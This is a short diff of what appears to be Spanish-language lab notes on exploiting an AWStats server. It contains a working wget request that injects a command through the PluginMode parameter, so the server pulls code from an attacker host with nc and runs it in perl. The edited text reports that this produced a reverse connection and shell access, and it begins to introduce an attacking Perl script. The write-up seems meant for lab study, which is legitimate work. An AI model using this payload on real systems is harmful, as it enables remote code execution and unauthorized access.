@@ -5,7 +5,10 @@ En dos terminales diferentes ejecutamos:
 Después ejecutamos:
   wget --no-proxy "http://10.0.2.5/awstats/awstats.pl?&amp;PluginMode=:print+system('nc+10.0.2.4+80+|+/usr/bin/perl')+;"
 
-El archivo script.pl es:
+Con este comando, el servidor estableció una conexión al puerto 443 del atacante y desde la terminal que escuchaba en ese
+puerto obtuvimos acceso a la shell.
+
+El archivo script.pl contiene:
 
 #!/usr/bin/perl
 use Net::Telnet ();
